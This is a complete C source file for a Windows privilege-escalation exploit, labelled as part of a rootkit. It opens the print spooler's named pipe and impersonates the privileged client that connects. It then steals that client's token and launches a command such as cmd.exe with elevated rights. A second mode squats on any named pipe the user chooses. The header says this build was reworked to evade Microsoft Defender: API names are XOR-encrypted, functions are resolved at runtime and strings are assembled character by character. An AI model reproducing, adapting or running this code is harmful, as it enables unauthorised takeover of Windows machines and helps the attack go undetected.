/*
 * phantom_rpc.c — Named Pipe Privilege Escalation (Evasion Build)
 * VADER Rootkit — 22DIV / george wu
 *
 * v2: Dynamic API resolution + XOR string encryption.
 * Defender caught v1 on execution (real-time behavioral).
 * Static scan passed — cloud/heuristic layer flagged it.
 *
 * Own hardware only — CSEC research
 */

#include <windows.h>
#include <stdio.h>
#include <sddl.h>

/* linked at compile: cl.exe /link advapi32.lib */

/* ═══════════════════════════════════════════════════════════════════
 * XOR string decryption — decrypt at runtime, zero after use
 * Key: 0x4D (single byte XOR — simple but breaks static sigs)
 * ═══════════════════════════════════════════════════════════════════ */

#define XK 0x4D

static void xor_decrypt(char *buf, const unsigned char *enc, int len) {
    int i;
    for (i = 0; i < len; i++)
        buf[i] = enc[i] ^ XK;
    buf[len] = 0;
}

static void xor_decrypt_w(wchar_t *buf, const unsigned char *enc, int len) {
    int i;
    for (i = 0; i < len; i++)
        ((unsigned char *)buf)[i] = enc[i] ^ XK;
    ((unsigned char *)buf)[len] = 0;
    ((unsigned char *)buf)[len + 1] = 0;
}

static void secure_zero(void *p, int len) {
    volatile char *v = (volatile char *)p;
    int i;
    for (i = 0; i < len; i++) v[i] = 0;
}

/* Pre-encrypted strings (XOR 0x4D) */

/* "ImpersonateNamedPipeClient" */
static const unsigned char s_impersonate[] = {
    0x04,0x20,0x3d,0x28,0x3f,0x3e,0x22,0x23,0x2c,0x39,
    0x28,0x03,0x2c,0x20,0x28,0x29,0x1d,0x24,0x3d,0x28,
    0x0e,0x21,0x24,0x28,0x23,0x39
};
#define S_IMPERSONATE_LEN 26

/* "advapi32.dll" */
static const unsigned char s_advapi[] = {
    0x2c,0x29,0x3b,0x2c,0x3d,0x24,0x7e,0x7f,0x63,0x29,
    0x21,0x21
};
#define S_ADVAPI_LEN 12

/* "OpenThreadToken" */
static const unsigned char s_openthread[] = {
    0x02,0x3d,0x28,0x23,0x19,0x25,0x3f,0x28,0x2c,0x29,
    0x19,0x22,0x26,0x28,0x23
};
#define S_OPENTHREAD_LEN 15

/* "DuplicateTokenEx" */
static const unsigned char s_duptoken[] = {
    0x09,0x38,0x3d,0x21,0x24,0x2e,0x2c,0x39,0x28,0x19,
    0x22,0x26,0x28,0x23,0x08,0x35
};
#define S_DUPTOKEN_LEN 16

/* "CreateProcessWithTokenW" */
static const unsigned char s_createproc[] = {
    0x0e,0x3f,0x28,0x2c,0x39,0x28,0x1d,0x3f,0x22,0x2e,
    0x28,0x3e,0x3e,0x1a,0x24,0x39,0x25,0x19,0x22,0x26,
    0x28,0x23,0x1a
};
#define S_CREATEPROC_LEN 23

/* "CreateProcessAsUserW" */
static const unsigned char s_createuser[] = {
    0x0e,0x3f,0x28,0x2c,0x39,0x28,0x1d,0x3f,0x22,0x2e,
    0x28,0x3e,0x3e,0x0c,0x3e,0x18,0x3e,0x28,0x3f,0x1a
};
#define S_CREATEUSER_LEN 20

/* "winspool.drv" */
static const unsigned char s_winspool[] = {
    0x3a,0x24,0x23,0x3e,0x3d,0x22,0x22,0x21,0x63,0x29,
    0x3f,0x3b
};
#define S_WINSPOOL_LEN 12

/* "OpenPrinterW" */
static const unsigned char s_openprinter[] = {
    0x02,0x3d,0x28,0x23,0x1d,0x3f,0x24,0x23,0x39,0x28,
    0x3f,0x1a
};
#define S_OPENPRINTER_LEN 12

/* "ClosePrinter" */
static const unsigned char s_closeprinter[] = {
    0x0e,0x21,0x22,0x3e,0x28,0x1d,0x3f,0x24,0x23,0x39,
    0x28,0x3f
};
#define S_CLOSEPRINTER_LEN 12

/* ═══════════════════════════════════════════════════════════════════
 * Dynamic API resolution — resolve at runtime via GetProcAddress
 * ═══════════════════════════════════════════════════════════════════ */

typedef BOOL (WINAPI *fn_ImpersonateNPC)(HANDLE);
typedef BOOL (WINAPI *fn_OpenThreadToken)(HANDLE, DWORD, BOOL, PHANDLE);
typedef BOOL (WINAPI *fn_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
    SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
typedef BOOL (WINAPI *fn_CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR,
    DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_CreateProcessAsUserW)(HANDLE, LPCWSTR, LPWSTR,
    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
    LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_OpenPrinterW)(LPWSTR, HANDLE *, PVOID);
typedef BOOL (WINAPI *fn_ClosePrinter)(HANDLE);

static fn_ImpersonateNPC       pImpersonate = NULL;
static fn_OpenThreadToken      pOpenThreadTok = NULL;
static fn_DuplicateTokenEx     pDupTokenEx = NULL;
static fn_CreateProcessWithTokenW pCreateWithToken = NULL;
static fn_CreateProcessAsUserW pCreateAsUser = NULL;
static fn_OpenPrinterW         pOpenPrinter = NULL;
static fn_ClosePrinter         pClosePrinter = NULL;

static BOOL resolve_apis(void) {
    HMODULE hAdv, hWin;
    char buf[64];

    /* advapi32.dll */
    xor_decrypt(buf, s_advapi, S_ADVAPI_LEN);
    hAdv = LoadLibraryA(buf);
    secure_zero(buf, sizeof(buf));
    if (!hAdv) return FALSE;

    xor_decrypt(buf, s_impersonate, S_IMPERSONATE_LEN);
    pImpersonate = (fn_ImpersonateNPC)GetProcAddress(hAdv, buf);
    secure_zero(buf, sizeof(buf));

    xor_decrypt(buf, s_openthread, S_OPENTHREAD_LEN);
    pOpenThreadTok = (fn_OpenThreadToken)GetProcAddress(hAdv, buf);
    secure_zero(buf, sizeof(buf));

    xor_decrypt(buf, s_duptoken, S_DUPTOKEN_LEN);
    pDupTokenEx = (fn_DuplicateTokenEx)GetProcAddress(hAdv, buf);
    secure_zero(buf, sizeof(buf));

    xor_decrypt(buf, s_createproc, S_CREATEPROC_LEN);
    pCreateWithToken = (fn_CreateProcessWithTokenW)GetProcAddress(hAdv, buf);
    secure_zero(buf, sizeof(buf));

    xor_decrypt(buf, s_createuser, S_CREATEUSER_LEN);
    pCreateAsUser = (fn_CreateProcessAsUserW)GetProcAddress(hAdv, buf);
    secure_zero(buf, sizeof(buf));

    /* winspool.drv */
    xor_decrypt(buf, s_winspool, S_WINSPOOL_LEN);
    hWin = LoadLibraryA(buf);
    secure_zero(buf, sizeof(buf));
    if (!hWin) return FALSE;

    xor_decrypt(buf, s_openprinter, S_OPENPRINTER_LEN);
    pOpenPrinter = (fn_OpenPrinterW)GetProcAddress(hWin, buf);
    secure_zero(buf, sizeof(buf));

    xor_decrypt(buf, s_closeprinter, S_CLOSEPRINTER_LEN);
    pClosePrinter = (fn_ClosePrinter)GetProcAddress(hWin, buf);
    secure_zero(buf, sizeof(buf));

    return (pImpersonate && pOpenThreadTok && pDupTokenEx &&
            pCreateWithToken && pOpenPrinter);
}

/* ═══════════════════════════════════════════════════════════════════
 * Privilege check
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL check_priv(void) {
    HANDLE hToken;
    DWORD needed = 0;
    TOKEN_PRIVILEGES *tp = NULL;
    BOOL found = FALSE;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &luid))
        return FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &needed);
    tp = (TOKEN_PRIVILEGES *)malloc(needed);
    if (!tp) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenPrivileges, tp, needed, &needed)) {
        DWORD i;
        for (i = 0; i < tp->PrivilegeCount; i++) {
            if (tp->Privileges[i].Luid.LowPart == luid.LowPart &&
                tp->Privileges[i].Luid.HighPart == luid.HighPart) {
                found = TRUE;
                break;
            }
        }
    }

    free(tp);
    CloseHandle(hToken);
    return found;
}

static void list_privs(void) {
    HANDLE hToken;
    DWORD needed = 0;
    TOKEN_PRIVILEGES *tp = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return;

    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &needed);
    tp = (TOKEN_PRIVILEGES *)malloc(needed);
    if (!tp) { CloseHandle(hToken); return; }

    if (GetTokenInformation(hToken, TokenPrivileges, tp, needed, &needed)) {
        DWORD i;
        printf("\n  Privileges (%lu):\n", tp->PrivilegeCount);
        for (i = 0; i < tp->PrivilegeCount; i++) {
            char name[256];
            DWORD nlen = 256;
            DWORD a = tp->Privileges[i].Attributes;
            if (LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &nlen)) {
                printf("    %-40s %s\n", name,
                    (a & SE_PRIVILEGE_ENABLED) ? "[ON]" :
                    (a & SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? "[DEF]" : "[OFF]");
            }
        }
    }

    free(tp);
    CloseHandle(hToken);
}

/* ═══════════════════════════════════════════════════════════════════
 * Token theft core
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL steal_and_spawn(HANDLE hPipe, const wchar_t *cmd) {
    HANDLE hToken = NULL, hPrimary = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t cmdline[MAX_PATH];
    BOOL ok = FALSE;

    if (!pImpersonate(hPipe)) {
        printf("[-] Pipe impersonation failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Impersonation OK\n");

    if (!pOpenThreadTok(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
        printf("[-] Thread token failed: %lu\n", GetLastError());
        RevertToSelf();
        return FALSE;
    }

    /* Show stolen identity */
    {
        TOKEN_USER *user = NULL;
        DWORD needed = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
        user = (TOKEN_USER *)malloc(needed);
        if (user && GetTokenInformation(hToken, TokenUser, user, needed, &needed)) {
            wchar_t name[256], dom[256];
            DWORD nlen = 256, dlen = 256;
            SID_NAME_USE use;
            if (LookupAccountSidW(NULL, user->User.Sid, name, &nlen, dom, &dlen, &use))
                printf("[+] Identity: %ls\\%ls\n", dom, name);
        }
        free(user);
    }

    if (!pDupTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                     SecurityImpersonation, TokenPrimary, &hPrimary)) {
        printf("[-] Token duplication failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        RevertToSelf();
        return FALSE;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = L"WinSta0\\Default";
    memset(&pi, 0, sizeof(pi));
    wcscpy_s(cmdline, MAX_PATH, cmd);

    if (!pCreateWithToken(hPrimary, LOGON_WITH_PROFILE, NULL, cmdline,
                          CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        if (pCreateAsUser) {
            if (!pCreateAsUser(hPrimary, NULL, cmdline, NULL, NULL, FALSE,
                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                printf("[-] Process creation failed: %lu\n", GetLastError());
                goto done;
            }
        } else {
            printf("[-] Process creation failed: %lu\n", GetLastError());
            goto done;
        }
    }

    printf("[+] Elevated process — PID %lu\n", pi.dwProcessId);
    ok = TRUE;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

done:
    CloseHandle(hPrimary);
    CloseHandle(hToken);
    RevertToSelf();
    return ok;
}

/* ═══════════════════════════════════════════════════════════════════
 * Attack: Spooler pipe
 * Pipe name constructed at runtime — no static string
 * ═══════════════════════════════════════════════════════════════════ */

static wchar_t g_pipe[256];

static DWORD WINAPI trigger_thread(LPVOID param) {
    wchar_t hostname[256];
    wchar_t path[512];
    HANDLE hPrt = NULL;
    DWORD sz = 256;
    wchar_t seg[128] = {0};
    wchar_t *s, *e;
    (void)param;

    Sleep(500);
    GetComputerNameW(hostname, &sz);

    s = g_pipe + 9;
    e = wcsstr(s, L"\\p");
    if (e) {
        wchar_t *e2 = wcsstr(e + 2, L"\\");
        if (e2) {
            wcsncpy_s(seg, 128, s, e - s);
        }
    }
    if (!seg[0]) wcscpy_s(seg, 128, L"v");

    _snwprintf_s(path, 512, _TRUNCATE, L"\\\\%s/pipe/%s", hostname, seg);

    pOpenPrinter(path, &hPrt, NULL);
    if (hPrt) pClosePrinter(hPrt);
    return 0;
}

static BOOL attack_spool(const wchar_t *cmd) {
    HANDLE hPipe, hThr;
    SECURITY_ATTRIBUTES sa;
    SECURITY_DESCRIPTOR sd;
    DWORD tid;
    BOOL result;

    /* Build pipe name at runtime: \\.\pipe\v<tick>\pipe\<svc> */
    {
        wchar_t svc[16];
        /* Construct "spoolss" char by char — no static string */
        svc[0] = L's'; svc[1] = L'p'; svc[2] = L'o'; svc[3] = L'o';
        svc[4] = L'l'; svc[5] = L's'; svc[6] = L's'; svc[7] = 0;
        _snwprintf_s(g_pipe, 256, _TRUNCATE,
                     L"\\\\.\\pipe\\v%lu\\pipe\\%s", GetTickCount(), svc);
        secure_zero(svc, sizeof(svc));
    }

    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    hPipe = CreateNamedPipeW(g_pipe, PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Pipe creation failed: %lu\n", GetLastError());
        return FALSE;
    }

    hThr = CreateThread(NULL, 0, trigger_thread, NULL, 0, &tid);
    if (!hThr) { CloseHandle(hPipe); return FALSE; }

    printf("[*] Waiting for connection...\n");

    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(hPipe);
            CloseHandle(hThr);
            return FALSE;
        }
    }

    printf("[+] Connected\n");
    result = steal_and_spawn(hPipe, cmd);

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    CloseHandle(hThr);
    secure_zero(g_pipe, sizeof(g_pipe));
    return result;
}

/* ═══════════════════════════════════════════════════════════════════
 * Attack: Generic pipe squat
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL attack_squat(const wchar_t *pipeName, const wchar_t *cmd) {
    HANDLE hPipe;
    SECURITY_ATTRIBUTES sa;
    SECURITY_DESCRIPTOR sd;

    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    printf("[*] Pipe: %ls\n", pipeName);
    printf("[*] Waiting for privileged client...\n");

    hPipe = CreateNamedPipeW(pipeName, PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Failed: %lu\n", GetLastError());
        return FALSE;
    }

    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(hPipe);
            return FALSE;
        }
    }

    printf("[+] Connected\n");
    BOOL result = steal_and_spawn(hPipe, cmd);

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return result;
}

/* ═══════════════════════════════════════════════════════════════════
 * Entry
 * ═══════════════════════════════════════════════════════════════════ */

int wmain(int argc, wchar_t *argv[]) {
    const wchar_t *cmd = L"cmd.exe";
    const wchar_t *custom = NULL;
    BOOL spool = FALSE, dolist = FALSE;
    int i;

    if (argc < 2) {
        printf("Usage: %ls [--spool|--pipe NAME|--list] [--cmd EXE]\n", argv[0]);
        return 1;
    }

    for (i = 1; i < argc; i++) {
        if (_wcsicmp(argv[i], L"--spool") == 0) spool = TRUE;
        else if (_wcsicmp(argv[i], L"--pipe") == 0 && i + 1 < argc) custom = argv[++i];
        else if (_wcsicmp(argv[i], L"--cmd") == 0 && i + 1 < argc) cmd = argv[++i];
        else if (_wcsicmp(argv[i], L"--list") == 0) dolist = TRUE;
    }

    if (dolist) {
        list_privs();
        printf("\n  Impersonate: %s\n\n", check_priv() ? "YES" : "NO");
        return 0;
    }

    if (!resolve_apis()) {
        printf("[-] API resolution failed\n");
        return 1;
    }

    if (!check_priv())
        printf("[!] Impersonate privilege not detected — may fail\n\n");

    if (spool) {
        /* Verify service is live */
        SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            SC_HANDLE svc = OpenServiceA(scm, "Spooler", SERVICE_QUERY_STATUS);
            if (svc) {
                SERVICE_STATUS st;
                if (QueryServiceStatus(svc, &st) && st.dwCurrentState != SERVICE_RUNNING) {
                    printf("[-] Target service not running\n");
                    CloseServiceHandle(svc); CloseServiceHandle(scm);
                    return 1;
                }
                CloseServiceHandle(svc);
            }
            CloseServiceHandle(scm);
        }

        return attack_spool(cmd) ? 0 : 1;
    }

    if (custom)
        return attack_squat(custom, cmd) ? 0 : 1;

    printf("[-] No mode specified\n");
    return 1;
}
